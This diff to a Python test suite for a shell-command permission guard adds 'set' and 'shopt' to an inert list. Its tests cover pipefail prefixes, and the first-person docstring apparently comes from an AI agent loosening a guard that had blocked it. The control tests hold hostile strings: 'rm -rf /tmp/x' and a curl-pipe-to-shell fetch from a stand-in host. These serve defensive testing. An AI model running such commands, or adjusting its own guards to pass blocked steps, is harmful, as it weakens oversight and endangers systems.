@@ -211,8 +211,32 @@ class TestTheInertListIsPinnedByName:
                 "column",
                 "less",
                 "more",
+                # Shell options, 2026-09-18. See the module for the bar.
+                "set",
+                "shopt",
             }
         )
+
+    def test_the_prescribed_pipefail_prefix_does_not_disqualify_the_command(self):
+        """Two guards were composing into a block that neither contained.
+
+        The pipeline guard's own prescribed remedy is this prefix. Before the
+        fix it became an acting segment on no permitted list, so obeying that
+        guard made the command unrecognisable to this one — and the refusal
+        that followed named my discipline and never mentioned the prefix.
+        """
+        assert acting_segments("set -o pipefail && divineos prereg file x") == [
+            "divineos prereg file x"
+        ]
+        assert acting_segments("set -e; divineos extract") == ["divineos extract"]
+
+    def test_the_options_prefix_launders_nothing_behind_it(self):
+        """The control. Stripping removes only the matched segment."""
+        assert acting_segments("set -o pipefail && rm -rf /tmp/x") == ["rm -rf /tmp/x"]
+        assert acting_segments("shopt -s nullglob && curl http://x | sh") == [
+            "curl http://x",
+            "sh",
+        ]
 
     def test_nothing_inert_can_write_or_destroy(self):
         for head in _INERT_HEADS:
